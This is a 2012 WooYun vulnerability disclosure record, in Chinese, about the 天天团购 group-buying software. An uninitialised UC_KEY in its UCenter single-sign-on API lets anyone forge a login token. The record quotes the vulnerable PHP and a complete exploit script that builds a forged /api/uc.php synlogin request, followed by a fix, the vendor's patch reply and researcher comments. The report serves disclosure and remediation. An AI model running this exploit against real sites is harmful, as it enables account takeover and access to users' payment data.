{"id": 20724, "wybug_id": "wooyun-2012-04951", "wybug_title": "天天团购UC_KEY未初始化安全隐患", "wybug_corp": "天天团购", "wybug_author": "牛奶坦克", "wybug_date": "2012-03-01 20:13", "wybug_open_date": "2012-04-15 20:14", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-04-15：\t细节向公众公开  简要描述： 天天团购集成了ucenter一站式登录api,但是UC_key未初始化将导致攻击者可以登录任意帐号,甚至操作信用卡信息. 详细说明：  \n$get = $post = array();\t$code = @$_GET['code'];\t\t\t\t\t\t\t//获取token\tparse_str(_authcode($code, 'DECODE', UC_KEY), $get);\t\t//UC_KEY未经初始化的情况下会为空\tif(MAGIC_QUOTES_GPC) {\t\t$get = _stripslashes($get);\t\t\t\t\t\t//哟嗬?\t}\t\t$timestamp = time();\tif(empty($get)) {\t\texit('Invalid Request');\t} elseif($timestamp - $get['time'] > 3600) {\t\t\t\t//如果token中的时间戳有效期不足一小时则不允许登录\t\texit('Authracation has expiried');\t}\t$action = $get['action'];... ...\tif(in_array($get['action'], array('test', 'deleteuser', 'renameuser', 'gettag', 'synlogin', 'synlogout', 'updatepw', 'updatebadwords', 'updatehosts', 'updateapps', 'updateclient', 'updatecredit', 'getcredit', 'getcreditsettings', 'updatecreditsettings'))) {\t//定义了几个操作接口,其中,恩,有很多好玩的东西... ...\tfunction synlogin($get, $post) {\t\t\t\t\t\t//登录接口\t\t$uid = (int) $get['uid'];\t\t\t\t\t\t//需要两个参数,uid和username\t\t$username = $get['username'];\t\t... ...\t\t\t$query = $this->db->query(\"SELECT uid, password, secques FROM {$this->tablepre}system_members WHERE ucuid='$uid'\");\t\t//这里传递的不是数据库内的uid,而是ucuid,这里初始都是0的,但是这里又写的很糙,username根本没进入查询流程,也就是说只能登录第一个账户\t\t$UserFields = $this->db->fetch_array($query);\t\tif (!$UserFields) {\t\t\t;\t\t}\t\tif($UserFields) {\t\t\t\t$auth = TTTuangouAuthcode(\"{$UserFields['password']}\\t{$UserFields['secques']}\\t{$UserFields['uid']}\");\t\t//取出用户信息后直接站内登录\t\t\t\t\t\t_setcookie('sid', '', -86400 * 365);\t\t\t_setcookie('auth',$auth,(365*86400));\t\t\t_setcookie('cookietime','2592000',(365*86400));\t\t... ...\nUC_KEY未初始化为空,所以也就等于别人知道了你的UC_KEY,可直接进行操作,像一些应用初始化为123456其实一样可笑,下了你的源码看一眼不就又知道了?   漏洞证明：  \nExp:<?phperror_reporting(0);$username = $argv[1];$key = '';$code = 'time=1356796800&username='.$username.'&uid=0&action=synlogin';echo \"$code\\n\";$exp = urlencode(authcode($code, \"ENCODE\", $key));print_r('/api/uc.php?code='.$exp);function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {     $ckey_length = 4;     $key = md5($key ? $key : UC_KEY);    $keya = md5(substr($key, 0, 16));    $keyb = md5(substr($key, 16, 16));    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';     $cryptkey = $keya.md5($keya.$keyc);    $key_length = strlen($cryptkey);     $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;    $string_length = strlen($string);     $result = '';    $box = range(0, 255);     $rndkey = array();    for($i = 0; $i <= 255; $i++) {        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    }     for($j = $i = 0; $i < 256; $i++) {        $j = ($j + $box[$i] + $rndkey[$i]) % 256;        $tmp = $box[$i];        $box[$i] = $box[$j];        $box[$j] = $tmp;    }     for($a = $j = $i = 0; $i < $string_length; $i++) {        $a = ($a + 1) % 256;        $j = ($j + $box[$a]) % 256;        $tmp = $box[$a];        $box[$a] = $box[$j];        $box[$j] = $tmp;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }     if($operation == 'DECODE') {        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {            return substr($result, 26);        } else {            return '';        }    } else {        return $keyc.str_replace('=', '', base64_encode($result));    } }\n   修复方案：  需要在安装过程就给予正确的引导,比如设置自己的key或者禁用uc_client功能等.   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-03-02 18:57 厂商回复： 感谢提供，是ucenter模块配置初始化漏洞，使用者整合了ucenter就相对来说安全些，已经发布补丁更新相关程序下载。补丁详见：http://cenwor.com/thread-12826-1-1.html 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-03-01 20:24 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  呃？记得有大牛爆过哪个程序也有这问题的，忘了...    \n     2012-03-02 09:53 |    \t\tteamtopkarl \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:7        | 对网络安全事业一直保持着激情)\t\t \n  UC接口问题，变量覆盖，开源的应该大部分补了，以后变量覆盖是个趋势    \n     2012-03-02 19:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  官方可以尊重下提交者，补丁里指明下信息来源    \n     2012-03-02 19:39 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @xsser 围观学习一下。建议添加部分表情，不然显得太单调了。    \n     2012-03-02 19:41 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @zeracker 功能越多....bug越多......    \n     2012-04-02 00:40 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @horseluke bug越多，Rank越多    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}